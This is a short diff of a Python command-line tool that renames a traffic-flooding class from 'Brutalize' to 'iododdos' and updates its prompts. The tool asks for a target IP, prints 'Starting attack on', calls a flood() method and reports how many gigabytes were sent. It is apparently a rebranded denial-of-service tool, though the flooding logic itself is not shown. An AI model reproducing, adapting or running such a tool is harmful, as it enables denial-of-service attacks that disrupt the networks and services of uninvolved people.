@@ -154,7 +154,7 @@ def main():
       Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)),
                         Center.XCenter(banner)))
 
-  ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
+  ip = input(stage(f"Enter the IP to IODODDOS {purple}->{fluo2} ", '?'))
   print()
 
   try:
@@ -212,7 +212,7 @@ def main():
   cport = '' if port is None else f'{purple}:{fluo2}{port}'
   print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
 
-  iodo = Brutalize(ip, port, force, threads)
+  iodo = iododdos(ip, port, force, threads)
   try:
     iodo.flood()
   except:
@@ -225,7 +225,7 @@ def main():
     iodo.stop()
     print(
         stage(
-            f"Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(iodo.total, 1)} {white}Gb.",
+            f"Attack stopped. {fluo2}{ip}{cport}{white} was iodolized with {fluo}{round(iodo.total, 1)} {white}Gb.",
             '.'))
   print('\n')
   sleep(1)
